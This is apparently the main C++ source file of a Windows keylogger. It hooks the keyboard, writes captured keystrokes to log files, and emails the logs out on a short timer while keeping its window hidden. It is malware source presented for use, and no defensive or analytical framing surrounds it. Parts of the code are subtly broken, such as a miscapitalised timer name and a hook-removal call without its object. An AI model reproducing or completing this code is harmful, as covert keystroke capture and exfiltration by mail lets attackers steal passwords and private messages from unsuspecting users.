#include <iostream>
#include <filesystem>
#include <windows.h>

#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeyboardManager.h"

#define FREQUENCY_MINUTES 0.2

using namespace std;

// Global Keyboard Manager
KeyboardManager keyboardManager;

// TODO delete logs after running them
// TODO reorganize Timer class

// MailTimer Handler function
void DumpKeylog()
{
	if (keyboardManager.keylog.empty())
		return;
	
	std::string filename = IO::WriteLog(keyboardManager.keylog);

	if (filename.empty())
	{
		Helper::WriteAppLog("File Creation was not succesfull. Keylog'" + keyboardManager.keylog + "'");
		return;
	}

	std::vector<std::string> attatchments = IO::GetAttatchments(IO::GetPath(true));
	int x = Mail::SendMail("Log [" + filename + "]", "", filename);

	if (x != 7)
		Helper::WriteAppLog("Mail was not sent. Error code: " + Helper::ToString(x));
	else
		keyboardManager.keylog = "";
}

int main(int argc, char** argv)
{
	// Makes output directory for logs
	IO::MKDir(IO::GetPath(true));

	// Start Listening to keystrokes
	keyboardManager.InstallHooks();

	// Create and Start mail timer
	Timer mailTimer(DumpKeylog, FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
	mailTimer.Start(true);
	Helper::WriteAppLog("Mail Timer Started");

	// Run infinite loop and prevent console window from showing
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}

	UninstallHooks();
	MailTimer.Stop();
	return 0;
}
